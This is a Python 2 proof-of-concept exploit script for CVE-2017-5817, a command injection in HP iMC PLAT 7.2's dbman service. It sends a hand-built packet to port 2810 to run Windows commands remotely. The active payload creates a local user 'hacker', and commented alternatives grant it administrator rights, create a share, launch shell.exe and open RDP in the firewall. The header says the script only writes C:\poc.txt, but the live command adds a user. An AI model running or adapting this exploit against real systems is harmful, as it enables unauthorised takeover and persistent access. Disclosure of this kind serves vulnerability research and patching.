#!/opt/local/bin/python2.7

# Exploit Title: HP iMC Plat 7.2 dbman Opcode 10007 Command Injection RCE
# Date: 11-28-2017
# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: www.hpe.com
# Software Link: https://h10145.www1.hpe.com/Downloads/DownloadSoftware.aspx?SoftwareReleaseUId=16759&ProductNumber=JG747AAE&lang=en&cc=us&prodSeriesId=4176535&SaidNumber=
# Version: iMC PLAT v7.2 (E0403) Standard
# Tested on: Windows Server 2008 R2 Enterprise 64-bit
# CVE : CVE-2017-5817
# See Also: http://www.zerodayinitiative.com/advisories/ZDI-17-341/

# note that this PoC will create a file 'C:\poc.txt'

import socket, sys

ip = '172.30.0.103' 
port = 2810

command = "net user hacker Admin@10 /add"
#command = "net localgroup administrators hacker /add"
#command = "mkdir c:\web"
#command = "net share web=\"c:\web\" /grant:hacker,change"
#command = "start c:\web\shell.exe"
#command = "netsh advfirewall firewall add rule name='Open Remote Desktop' protocol=TCP dir=in localport=3389 action=allow"
#command = "echo PoC 12345 > C:\\poc.txt" # command to run

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

buf = "\x00\x00\x27\x17\x00\x00\x00"
buf += chr(109 + 10 + len(command))
buf += "\x30\x81"
buf += chr(109 + 7 + len(command))
buf += "\x04\x0c"
buf += ip
buf += ("\x04\x04\x41\x41\x41\x41\x04"
"\x04\x42\x42\x42\x42\x04\x04\x43\x43\x43\x43\x02\x01\x01\x02\x01"
"\x03\x04\x06\x4d\x41\x4e\x55\x41\x4c\x04\x04\x44\x44\x44\x44\x04")
buf += chr(len(command) + 7)
buf += "\x73\x61\x22\x26\x20"
buf += command
buf += ("\x20\x26\x04\x08\x70\x61\x73\x73\x77\x6f\x72\x64\x04"
"\x04\x00\x00\x04\x57\x04\x08\x69\x6e\x73\x74\x61\x6e\x63\x65\x04"
"\x04\x45\x45\x45\x45\x04\x04\x46\x46\x46\x46\x04\x04\x47\x47\x47"
"\x47\x04\x04\x48\x48\x48\x48\x30\x00\x02\x01\x01")
sock.send(buf)

sock.close()